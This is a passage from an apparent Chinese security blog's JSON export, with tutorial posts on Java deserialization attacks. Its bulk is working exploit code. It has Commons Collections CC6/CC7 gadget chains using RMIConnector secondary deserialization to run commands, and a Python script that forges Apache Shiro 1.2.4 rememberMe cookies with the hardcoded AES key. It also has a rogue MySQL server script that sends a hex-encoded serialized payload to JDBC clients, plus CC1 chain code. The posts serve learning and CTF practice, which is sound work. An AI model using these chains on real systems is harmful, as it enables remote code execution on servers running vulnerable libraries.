&lt;whitelist&gt;        &lt;regexp&gt;.*&lt;/regexp&gt;    &lt;/whitelist&gt;&lt;/config&gt;\n\n根据批注以及xml文件可以发现其中过滤了ChainedTransformer，TrAXFilter等类，将cc1-6基本上全ban了，但是他没有禁用InvokeTransformer这一关键类以及cc7这条链的入口点函数，说明这个类以及cc7的入口点应该是解题必备的。\n根据上面的思路进行构造，将cc7的入口点直接和InvokeTransformer进行组合操作，中间不调用ChainedTransformer，但是现在是有一个问题的，就是runtime是无法序列化的，又不能调用ChainedTransformer，所以这里需要一个新的可以执行命令的方法，又或者可以进行二次反序列化，因此这里使用RMI二次反序列化进行绕过。\nRMIConnector二次反序列化原理RMIConnector是RMI中负责远程连接的类，位于javax.management.remote.rmi.RMIConnector。\n首先看到其findRMIServerJRMP方法\n\n可以发现其接受一个base64的字符串并将其解密并进行了反序列化操作，也就是oin.readObject();继续向上找谁调用了findRMIServerJRMP，并且传入的base64是可控的，找到findRMIServer这个方法。\n\n可以发现，当path开头为&#x2F;stub&#x2F;时将会调用findRMIServerJRMP，并且将传入截取之后的path，继续向上寻找，找到connct中调用了该方法。\n\n当然调用条件为rmiServer&#x3D;null，寻找可以让rmiServer为null的构造方法，找到RMIConnector\n\n其只构造JMXServiceURL和environment完美符合条件。\n所以只需要构造成这样，然后可以使用cc链对rmiConnector的connct方法进行调用即可触发二次反序列化。\nJMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/base64string&quot;);RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);\n\n因为不需要多次调用invokerTransformer，所以无需使用chainedTransformer，那就会又有一个问题，就是transform的key(input)应该如何传入。\n\n如果可以使用TiedMapEntry的话可以直接将需要的类传给他的第二个参数，由于没有ConstantTransformer，这将会直接改变key的值(cc1中ConstantTransformer的作用)。\npayloadpayload_cc6：\npackage org.example.RMIConnector;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.remote.JMXServiceURL;import javax.management.remote.rmi.RMIConnector;import java.io.*;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;import java.util.HashSet;import java.util.Map;public class RMIConnector2 &#123;    public static void main(String[] args) throws Exception&#123;        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);        setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/&quot;+getCC6Payload(&quot;calc&quot;));        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();        Map&lt;Object,Object&gt; lazymap =  LazyMap.decorate(map,new ConstantTransformer(1));        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,rmiConnector);        HashMap&lt;Object,Object&gt; map1 = new HashMap&lt;&gt;();        map1.put(tiedMapEntry,&quot;aaa&quot;);        lazymap.remove(rmiConnector);        setFieldValue(lazymap,&quot;factory&quot;, invokerTransformer);        Serialize(map1);        Unserialize(&quot;ser.bin&quot;);    &#125;    public static String getCC6Payload(String cmd) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(&quot;useless&quot;));        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();        hashMap2.put(tiedMapEntry, &quot;def&quot;);        //修改为HashSet调用readObject方法        HashSet&lt;Object&gt; hashSet = new HashSet&lt;&gt;();        setFieldValue(hashSet, &quot;map&quot;, hashMap2);        lazyMap.remove(&quot;abc&quot;);        setFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(barr);        oos.writeObject(hashSet);        return Base64.getEncoder().encodeToString(barr.toByteArray());    &#125;    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj, value);    &#125;    public static void Serialize(Object obj) throws IOException &#123;        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        objectOutputStream.writeObject(obj);    &#125;    public static Object Unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));        Object obj = objectInputStream.readObject();        return obj;    &#125;&#125;\n\n当然在这个题中TiedMapEntry是被禁用了的，同上面的思路还是使用cc7的入口点来调用RMIConnector。\n这里需要注意一点的就是key的设置，由于这里没有TiedMapEntry，所以key是无法直接反射进行传参的，并且LazyMap是基于hashMap1和hashMap2进行懒加载的，所以在实际储存和访问key时需要先反射来访问hashMap1中的table数组，从中获取到我们需要修改的key的Node对象(这个对象中包含了key和value)，对该node对象进行反射修改key。\n通过调试首先可以看到table数组中的值为node对象\n\n然后看到其中的key和value\n\n继续调试，发现key从1被替换为rmiConnector\n\ncc7payload\npackage org.example.RMIConnector;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.remote.JMXServiceURL;import javax.management.remote.rmi.RMIConnector;import java.io.*;import java.lang.reflect.Field;import java.util.*;public class RMIConnector1 &#123;    public static void main(String[] args) throws Exception &#123;        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);        setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/&quot;+getCC6Payload(&quot;calc&quot;));        RMIConnector Rmiconnector = new RMIConnector(jmxServiceURL, null);        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);        Map hashMap1 = new HashMap();        Map hashMap2 = new HashMap();        Map map1 = LazyMap.decorate(hashMap1, new ConstantTransformer(1));        Map map2 = LazyMap.decorate(hashMap2, invokerTransformer);        map1.put(&quot;1&quot;, &quot;yy&quot;);        map2.put(&quot;zZ&quot;, Rmiconnector);        Hashtable hashtable = new Hashtable();        hashtable.put(map1, 1);        hashtable.put(map2, 1);        Field table = hashMap1.getClass().getDeclaredField(&quot;table&quot;);        table.setAccessible(true);        Object[] array = (Object[])table.get(hashMap1);        Object node = array[0];        if(node == null)&#123;            node = array[1];        &#125;        Field key = node.getClass().getDeclaredField(&quot;key&quot;);        key.setAccessible(true);        key.set(node, Rmiconnector);//        Serialize(hashtable);////        byte[] bytes = serialize(hashtable);//        System.out.println(Base64.getEncoder().encodeToString(bytes));        Unserialize(&quot;ser.bin&quot;);    &#125;    public static String getCC6Payload(String cmd) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        //随便设置一个值，防止后面再执行put方法的时候调用链子        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(&quot;useless&quot;));        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();        hashMap2.put(tiedMapEntry, &quot;def&quot;);        //修改为HashSet调用readObject方法        HashSet&lt;Object&gt; hashSet = new HashSet&lt;&gt;();        setFieldValue(hashSet, &quot;map&quot;, hashMap2);        lazyMap.remove(&quot;abc&quot;);        setFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(barr);        oos.writeObject(hashSet);        return Base64.getEncoder().encodeToString(barr.toByteArray());    &#125;    public static void setFieldValue(Object obj, String field, Object val) throws Exception&#123;        Field dField = obj.getClass().getDeclaredField(field);        dField.setAccessible(true);        dField.set(obj, val);    &#125;    public static byte[] serialize(Object obj) throws IOException &#123;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(obj);        return baos.toByteArray();    &#125;    public static Object Unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));        Object obj = objectInputStream.readObject();        return obj;    &#125;    public static void Serialize(Object obj) throws IOException &#123;        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        objectOutputStream.writeObject(obj);    &#125;&#125;\n\n参考文章https://tttang.com/archive/1701/#toc_rmiconnector\nhttps://www.freebuf.com/articles/web/372573.html#/\nhttps://www.yuque.com/dat0u/ctf/en3rym0131fuby60#\n","categories":["java反序列化"],"tags":["java反序列化，ctf"]},{"title":"shiro-550","url":"/2025/05/14/shiro-550/","content":"环境配置\njdk8u65\nTomcat8\nshiro 1.2.4\n\n漏洞影响版本：Shiro &lt;&#x3D; 1.2.4\n环境配置参考shiro\n注意事项：可以将p神项目中的pom.xml更改为1.8版本，要不然可能跑不起来。\nshiro-550 漏洞分析\n当rememberMe字段开启时，如果登录成功，返回包将会返回Set-Cookie，其中设置rememberMe字段，并且在之后的所有请求的cookie中都会存在rememberMe&#x3D;字段，可以通过该字段进行反序列化， 从而 getshell。\n\n造成这个漏洞的原因是因为在Shiro1.2.4 及之前的版本中，AES加密的密钥为硬编码在代码里，因此可以伪造rememberMe的加密。\nshiro的鉴权功能默认在拦截器中会进行调用，由于ShiroFilter的匹配规则是&#x2F;*，所以所有的请求都会被他处理，并进行权限校验，具体流程可以参考：https://www.cnblogs.com/77cxw/p/18092865\n这里从DefultSecurityManager#createSubject开始分析，这个方法用于创建一个完整的用户主体对象，并且对接受的请求做了一系列操作( 如：复制上下文、处理会话和身份信息等)，在处理身份信息的过程中将会触发解密以及反序列化的一系列操作。\n\n跟进resolverPrincipals方法，这个方法拥有处理用户的身份信息，在shiro1.2.4中也就是rememberMe字段。\n\n在resolvePrincipals中，首先获取当前上下文中已存储的身份信息，并判断是否为空，如果为空，则查找并获取之前rememberMe记住的身份信息，也就是进入getRememberedIdentity方法中。\n\n这个方法用于判断rememberMe是否打开，如果不为空，则说明启用了rememberMe功能，继续跟进getRememberedPrincipals方法，这是一个接口方法，具体的实现方法位于org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals\n\n这个方法就是我们获取rememberMe的序列化数据，以及对其进行解密和反序列化操作的方法了，首先可以看到这个方法先从getRememberedSerializedIdentity方法中获取了序列化数据，可以跟进去瞅瞅，也就是org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity这个类继承了AbstractRememberMeManager类，从而实现了getRememberedSerializedIdentity方法。\n\n这个类的主要作用就是获取Cookie中的rememberMe的值，并返回其base64解密后的结果，回到getRememberedPrincipals方法中，在获取到了序列化数据之后，如果不为空，就会进入convertBytesToPrincipals方法中对其进行解密和反序列化操作，也就是decrypt()和deserialize()\n\ndecrypt()解密分析解密的主要原因就是，我们需要伪造一个Cookie值，因此需要获得AES解密的密钥。\n\n进入decrypt()方法，可以看到其解密操作是cipherService.decrypt方法，这个方法获取的第二个参数就是密钥，也就是getDecryptionCipherKey()方法返回的数据。\n\n跟进后发现其返回decryptionCipherKey这个参数，赋值的方法就是下面的setDecryptionCipherKey方法\n\n查找谁调用了这个方法，从而寻找密钥的值，找到setCipherKey方法。\n\n继续查找谁调用了这个方法。\n\n找到AbstractRememberMeManager，并给了一个固定的参数，这个参数在上面有赋值，从而得到固定的key。\n\ndeserialize()反序列化\n跟进到deserialize()方法里，可以发现这是一个接口，查看实现方法有哪些。\n\n可以找到shiro包里的deserial()方法，其中调用了readObject()，所以存在反序列化漏洞。\n加密过程加密过程通过调试来进行分析，将断点打在onSuccessfulLogin中\n\n跟进到rememberIdentity方法里，这里用于用户名赋值以及保存。\n\n继续跟进到convertPrincipalsToBytes，这里进行了数据序列化操作，以及加密操作。\n\n加密操作和解密是差不多的，进入encrypt()\n\n看到getEncryptionCipherKey()中，继续跟进就可以找到调用的常量和之前的解密的一样。\n、\nshiro-550漏洞利用加密这里直接使用Drunkbaby师傅的脚本\n# －*-* coding:utf-8# @Time    :  2022/7/13 17:36# @Author  : Drunkbaby# @FileName: poc.py# @Software: VSCode# @Blog    ：https://drun1baby.github.io/from email.mime import basefrom pydoc import plainimport sysimport base64from turtle import modeimport uuidfrom random import Randomfrom Crypto.Cipher import AESdef get_file_data(filename): with open(filename, &#x27;rb&#x27;) as f: data = f.read() return datadef aes_enc(data): BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data))) return ciphertextdef aes_dec(enc_data): enc_data = base64.b64decode(enc_data) unpad = lambda s: s[:-s[-1]] key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = enc_data[:16] encryptor = AES.new(base64.b64decode(key), mode, iv) plaintext = encryptor.decrypt(enc_data[16:]) plaintext = unpad(plaintext) return plaintextif __name__ == &quot;__main__&quot;: data = get_file_data(&quot;ser.bin&quot;) print(aes_enc(data))\t\n\nCC11用之前的链子就行,生成ser.bin然后加密。\n\nCB1cb链有版本问题，之前用的是1.9.2的，shiro自带的是1.8.3的，更改一下版本就可以了\n\n#参考文章https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E9%80%9A%E8%BF%87-CC11-%E9%93%BE%E6%94%BB%E5%87%BB\nhttps://www.cnblogs.com/77cxw/p/18092865\nhttps://y0n3er.github.io/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BShiro550/\n","categories":["java反序列化"],"tags":["java反序列化"]},{"title":"mysql JDBC学习","url":"/2025/03/22/mysql%20JDBC/","content":"什么是JDBCJDBC（Java Database Connectivity）是一个 Java API，用于连接和操作数据库。它提供了一套标准接口，使得 Java 程序可以通过 SQL（结构化查询语言）与不同类型的数据库进行交互，而不依赖于特定数据库厂商的实现。\n经典的流程为\nClass.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); //加载数据库驱动Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/database_name&quot;, &quot;username&quot;, &quot;password&quot;); //建立数据库连接Statement stmt = conn.createStatement();  //创建sql语句对象ResultSet rs = stmt.executeQuery(&quot;SELECT * FROM table_name&quot;); //执行sql语句while (rs.next()) &#123;    System.out.println(rs.getString(&quot;column_name&quot;));&#125;  //处理查询结果//关闭资源rs.close();stmt.close();conn.close();\n\n漏洞分析首先，这个漏洞点位于com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor这个·拦截器中·的getObject方法。\n这个拦截器会在URL中指定属性queryInterceptors为ServerStatusDiffInterceptor时 进行调用，并且调用拦截器的preProcess和postProcess方法，从而调用getObject方法。\n\n先找到preProcess方法并继续跟进到populateMapWithSessionStatusValues方法。\n\n主要为populateMapWithSessionStatusValues方法中的resultSetToMap方法，继续跟进可以看到调用了getObject方法\n\n这里调用的getObject方法位于com.mysql.cj.jdbc.result.ResultSetImpl.class中\n\n可以发现在这里调用了readObject，其实往上看objIn参数是由columnsIndex一步步转化过来的。\n所以如果我们可以控制连接的url，让他与我们构造的恶意mysql服务器连接，并且让恶意mysql服务器在收到show session status后向客户端发送可行的payload，就可以使payload进行反序列化，从而触发命令执行\n漏洞复现python的恶意mysql服务端，payload为cc1到cc11都行，因为我项目这些环境都有，这里选的是cc1，这里的file文件是使用cc1链子序列化成的ser.bin\n# coding=utf-8import socketimport binasciiimport osgreeting_data=&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;response_ok_data=&quot;0700000200000002000000&quot;def receive_data(conn):    data = conn.recv(1024)    print(&quot;[*] Receiveing the package : &#123;&#125;&quot;.format(data))    return str(data).lower()def send_data(conn,data):    print(&quot;[*] Sending the package : &#123;&#125;&quot;.format(data))    conn.send(binascii.a2b_hex(data))def get_payload_content():    #file文件    file= r&#x27;ser.bin&#x27;    if os.path.isfile(file):        with open(file, &#x27;rb&#x27;) as f:            payload_content = str(binascii.b2a_hex(f.read()),encoding=&#x27;utf-8&#x27;)        print(&quot;open successs&quot;)    else:        print(&quot;open false&quot;)        #calc        payload_content=&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;    return payload_content# 主要逻辑def run():    while 1:        conn, addr = sk.accept()        print(&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;.format(addr[0],addr[1]))        # 1.先发送第一个 问候报文        send_data(conn,greeting_data)        while True:            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok            receive_data(conn)            send_data(conn,response_ok_data)            #其他过程            data=receive_data(conn)            #查询一些配置信息,其中会发送自己的 版本号            if &quot;session.auto_increment_increment&quot; in data:                _payload=&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;                send_data(conn,_payload)                data=receive_data(conn)            elif &quot;show warnings&quot; in data:                _payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;                send_data(conn, _payload)                data = receive_data(conn)            if &quot;set names&quot; in data:                send_data(conn, response_ok_data)                data = receive_data(conn)            if &quot;set character_set_results&quot; in data:                send_data(conn, response_ok_data)                data = receive_data(conn)            if &quot;show session status&quot; in data:                mysql_data = &#x27;0100000102&#x27;                mysql_data += &#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;                mysql_data += &#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;                # 为什么我加了EOF Packet 就无法正常运行呢？？                # 获取payload                payload_content=get_payload_content()                # 计算payload长度                payload_length = str(hex(len(payload_content)//2)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(4)                payload_length_hex = payload_length[2:4] + payload_length[0:2]                # 计算数据包长度                data_len = str(hex(len(payload_content)//2 + 4)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(6)                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]                mysql_data += data_len_hex + &#x27;04&#x27; + &#x27;fbfc&#x27;+ payload_length_hex                mysql_data += str(payload_content)                mysql_data += &#x27;07000005fe000022000100&#x27;                send_data(conn, mysql_data)                data = receive_data(conn)            if &quot;show warnings&quot; in data:                payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;                send_data(conn, payload)            breakif __name__ == &#x27;__main__&#x27;:    HOST =&#x27;0.0.0.0&#x27;    PORT = 3307    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    sk.bind((HOST, PORT))    sk.listen(1)    print(&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;.format(HOST,PORT))    run()\n\ncc1链子\npackage org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import org.omg.CORBA.portable.InvokeHandler;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.*;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class CC1 &#123;    public static void main(String[] args) throws InvocationTargetException, InstantiationException, IllegalAccessException &#123;//        try &#123;//            Runtime.getRuntime().exec(&quot;calc&quot;);//        &#125; catch (IOException e) &#123;//            throw new RuntimeException(e);//        &#125;//        Transformer[] transformers = new Transformer[]&#123;//                new ConstantTransformer(Runtime.class),//                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),//                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),//                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),//        &#125;;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;value&quot;,&quot;key&quot;);        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);        try &#123;            Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);            Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);            constructor.setAccessible(true);            Object o = constructor.newInstance(Target.class,transformedMap);            Serialize(o);            Unserialize(&quot;ser.bin&quot;);        &#125; catch (ClassNotFoundException | NoSuchMethodException | IOException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static void Serialize(Object obj) throws IOException &#123;        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        objectOutputStream.writeObject(obj);    &#125;    public static Object Unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));        Object obj = objectInputStream.readObject();        return obj;    &#125;&#125;\n\n同理，如果mysql服务中有其他的链子也可以调用其他的链子，比如cc2，cc3，shiro都可以。\n\n可以看到连接，并且成功弹出计算器。\n例题[羊城杯 2020]a_piece_of_java首先查看controller找到目标可以反序列化的路由，\n@GetMapping(value=&#123;&quot;/hello&quot;&#125;)public String hello(@CookieValue(value=&quot;data&quot;, required=false) String cookieData, Model model) &#123;    if (cookieData == null || cookieData.equals(&quot;&quot;)) &#123;        return &quot;redirect:/index&quot;;    &#125;    Info info = (Info)this.deserialize(cookieData);    if (info != null) &#123;        model.addAttribute(&quot;info&quot;, (Object)info.getAllInfo());    &#125;    return &quot;hello&quot;;&#125;\n\n这里使用的是deserialize在函数下面有写，是一个反序列化的函数\nprivate Object deserialize(String base64data) &#123;    Object obj;    ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64data));    try &#123;        SerialKiller ois = new SerialKiller((InputStream)bais, &quot;serialkiller.conf&quot;);        obj = ois.readObject();        ois.close();    &#125;    catch (Exception e) &#123;        e.printStackTrace();        return null;    &#125;    return 